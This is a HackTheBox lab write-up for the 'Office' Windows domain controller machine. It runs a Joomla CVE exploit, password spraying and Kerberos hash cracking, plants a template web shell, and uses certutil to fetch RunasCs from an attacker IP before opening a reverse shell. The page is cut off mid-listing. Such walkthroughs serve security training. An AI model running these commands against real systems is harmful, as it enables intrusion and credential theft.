@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.802638266418">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.7.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Office (Hard)</title>
+    <meta name="title" content="Office (Hard)">
+    <meta name="description" content="The \"Office\" machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/office/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/office/">
+    <meta property="og:title" content="Office (Hard)">
+    <meta property="og:description" content="The \"Office\" machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/office.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/office/">
+    <meta property="twitter:title" content="Office (Hard)">
+    <meta property="twitter:description" content="The \"Office\" machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/office.png">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.7.0.802638266418" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.802638266418" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.802638266418" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.802638266418" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="office-hard" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#office-hard">#</doc-anchor-trigger>
+        <span>Office (Hard)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-07-16</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/office.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>The &quot;Office&quot; machine on HackTheBox is a challenging Windows-based environment that incorporates a variety of vulnerabilities. These include exploiting a Joomla web application, analyzing PCAP files to extract Kerberos credentials, leveraging LibreOffice macros by manipulating registry settings, abusing MSKRP to dump DPAPI credentials, and exploiting Group Policies due to excessive privileges in Active Directory.</p>
+<doc-anchor-target id="reconnaissance">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
+        <span>Reconnaissance</span>
+    </h2>
+</doc-anchor-target>
+<p>The initial phase begins with an <code v-pre>nmap</code> scan, revealing that the target is a Windows Domain Controller.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -p- 10.10.11.3
+Nmap scan report for 10.10.11.3
+Host is up (0.015s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49675/tcp open  unknown
+49680/tcp open  unknown
+55563/tcp open  unknown</code></pre>
+</doc-codeblock></div>
+<p>The domain being used is <code v-pre>office.htb</code> and the Domain Controller is called <code v-pre>DC</code> so we can add those to our <code v-pre>/etc/hosts</code> file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ echo 10.10.11.3 office.htb dc.office.htb | sudo tee -a /etc/hosts</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="joomla-website">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#joomla-website">#</doc-anchor-trigger>
+        <span>Joomla Website</span>
+    </h3>
+</doc-anchor-target>
+<p>On accessing the website, we encounter a Joomla CMS for &quot;Tony Stark&#x27;s Iron Man Company&quot;. By checking the version, we identify it as <code v-pre>4.2.7</code>, which is vulnerable to a known exploit (<code v-pre>CVE-2023-23752</code>).</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/joomla-version.png" alt="Joomla Version">
+    <figcaption class="caption">Joomla Version</figcaption>
+</figure>
+</p>
+<p>We find a PoC script for <code v-pre>CVE-2023-23752</code> on <a href="https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT">GitHub</a>. Running the exploit provides us with a username and password.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python CVE-2023-23752.py -u http://10.10.11.3
+┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
+┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
+┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
+Coded By: K3ysTr0K3R --&gt; Hug me ʕっ•ᴥ•ʔっ
+
+[*] Checking if target is vulnerable
+[+] Target is vulnerable
+[*] Launching exploit against: http://10.10.11.3
+---------------------------------------------------------------------------------------------------------------
+[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
+[+] Target is vulnerable for usernames
+[+] Gathering username(s) for: http://10.10.11.3
+[+] Username: Administrator
+---------------------------------------------------------------------------------------------------------------
+[*] Checking if target is vulnerable for passwords at path: /api/index.php/v1/config/application?public=true
+[+] Target is vulnerable for passwords
+[+] Gathering password(s) for: http://10.10.11.3
+[+] Password: H0lOgrams4reTakIng0Ver754!</code></pre>
+</doc-codeblock></div>
+<p>Trying to login as the <code v-pre>Administrator</code> account on the Joomla backend fails. Looking at the endpoint where this password was found, it looks like this is the password for the Joomla database, so for now we proceed.</p>
+<doc-anchor-target id="domain-enumeration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#domain-enumeration">#</doc-anchor-trigger>
+        <span>Domain Enumeration</span>
+    </h3>
+</doc-anchor-target>
+<p>With port <code v-pre>88</code> open, we proceed to enumerate domain usernames using <code v-pre>kerbrute</code>, successfully identifying several valid accounts.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d office.htb --dc 10.10.11.3 jsmith.txt
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 07/16/24 - Ronnie Flathers @ropnop
+
+2024/07/16 09:52:36 &gt;  Using KDC(s):
+2024/07/16 09:52:36 &gt;  	10.10.11.3:88
+
+2024/07/16 09:52:41 &gt;  [+] VALID USERNAME:	 ewhite@office.htb
+2024/07/16 09:52:54 &gt;  [+] VALID USERNAME:	 dmichael@office.htb
+2024/07/16 09:52:56 &gt;  [+] VALID USERNAME:	 dwolfe@office.htb
+2024/07/16 09:53:01 &gt;  [+] VALID USERNAME:	 tstark@office.htb
+2024/07/16 09:53:54 &gt;  [+] VALID USERNAME:	 hhogan@office.htb
+2024/07/16 09:54:00 &gt;  [+] VALID USERNAME:	 ppotts@office.htb</code></pre>
+</doc-codeblock></div>
+<p>We found 6 usernames from the <code v-pre>jsmith</code> wordlist and add them to our <code v-pre>ad_users.txt</code> list.</p>
+<doc-anchor-target id="foothold">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="access-as-dwolfe">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#access-as-dwolfe">#</doc-anchor-trigger>
+        <span>Access as Dwolfe</span>
+    </h3>
+</doc-anchor-target>
+<p>By performing a password spraying attack using <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> we gain access to the domain with the <code v-pre>dwolfe</code> account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ cat ad_users.txt
+Administrator
+ewhite
+dmichael
+dwolfe
+tstark
+hhogan
+ppotts
+
+$ nxc smb office.htb -u ad_users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
+SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\ppotts:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE</code></pre>
+</doc-codeblock></div>
+<p>We explore the accessible shares, discovering a PCAP file that holds valuable information.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)
+
+[+] IP: 10.10.11.3:445	Name: office.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	SOC Analysis                                      	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share
+[*] Closed 1 connections</code></pre>
+</doc-codeblock></div>
+<p>The user <code v-pre>dwolfe</code> has access over the <code v-pre>SOC Analysis</code> share and can connect to the share using <code v-pre>smbclient</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
+# use SOC Analysis
+# mget *
+[*] Downloading Latest-System-Dump-8fbc124d.pcap</code></pre>
+</doc-codeblock></div>
+<p>The share contains a <code v-pre>PCAP</code> file, so lets inspect this further with WireShark. We start by showing the <code v-pre>Protocol Hierarchy</code> and notice there are several frames for the <code v-pre>Kerberos</code> protocol.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/pcap-kerberos.png" alt="PCAP Protocol Hierarchy">
+    <figcaption class="caption">PCAP Protocol Hierarchy</figcaption>
+</figure>
+</p>
+<p>Filtering the packets on the Kerberos protocol we notice an NTLM authentication session using SMB, which transmits an <code v-pre>AS-REQ</code>. In the second AS-REQ packet, we have a hashed timestamp. We can use this information to attempt to crack the password of the user that tried to authenticate.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/pcap-kerberos-req.png" alt="PCAP Kerberos As-Req">
+    <figcaption class="caption">PCAP Kerberos As-Req</figcaption>
+</figure>
+</p>
+<p>We can create a <code v-pre>Kerberos Pre-Auth</code> hash for the user <code v-pre>tstark</code>. To do this we first have to check the format that is expected by <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat</a>.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/kerberos-preauth-format.png" alt="Hashcat kerberos example">
+    <figcaption class="caption">Hashcat kerberos example</figcaption>
+</figure>
+</p>
+<p>We can now reconstruct the hash and crack it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 19900 tstark.hash $ROCKYOU
+
+&lt;SNIP&gt;
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
+
+&lt;SNIP&gt;</code></pre>
+</doc-codeblock></div>
+<p>We found the credentials to be <code v-pre>tstark:playboy69</code>.</p>
+<doc-anchor-target id="lateral-movement">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#lateral-movement">#</doc-anchor-trigger>
+        <span>Lateral Movement</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="access-as-tstark-user">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#access-as-tstark-user">#</doc-anchor-trigger>
+        <span>Access as TStark (User)</span>
+    </h3>
+</doc-anchor-target>
+<p>We found that <code v-pre>tstark</code> is also the administrator user for the Joomla backend so we can login with the following credentials: <code v-pre>Administrator:playboy69</code>. Next we can go to <code v-pre>System &gt; Site Templates</code> and select the available template. We can then add a web shell on one of the available pages (e.g. <code v-pre>error.php</code>) to get remote code execution.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/joomla-rce.png" alt="Joomla RCE">
+    <figcaption class="caption">Joomla RCE</figcaption>
+</figure>
+</p>
+<p>We test if we can get remote code execution with the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://10.10.11.3/templates/cassiopeia/error.php?bashee=whoami
+office\web_account</code></pre>
+</doc-codeblock></div>
+<p>Looks like we have command execution, so lets try to get a reverse shell. We can try to get a shell as <code v-pre>tstark</code> directly by using <a href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a> since we know the password of this user on the machine. We will start a Python webserver on our host and run the following commands to download our executable and get a shell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">certutil -f -urlcache http%3A%2F%2F10.10.14.7%3A8888%2FRunasCs.exe RunasCs.exe
+
+.%5CRunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.7%3A4444</code></pre>
+</doc-codeblock></div>
+<p>We start a <code v-pre>pwncat</code> listener to catch our shell. Afterwards we get a shell as <code v-pre>tstark</code> and can get the user flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ pwncat-cs -m windows -lp 4444
+(remote) tstark@DC:C:\Windows\system32$ cd C:\Users\tstark\Desktop
+(remote) tstark@DC:C:\Users\tstark\Desktop$ dir
+Directory: C:\Users\tstark\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         7/16/2024  12:58 PM             34 user.txt</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="access-as-ppotts">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#access-as-ppotts">#</doc-anchor-trigger>
+        <span>Access as PPotts</span>
+    </h3>
+</doc-anchor-target>
+<p>Looking at the installed applications, we notice <code v-pre>LibreOffice 5</code> is installed.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Program Files$ dir
+Directory: C:\Program Files
+
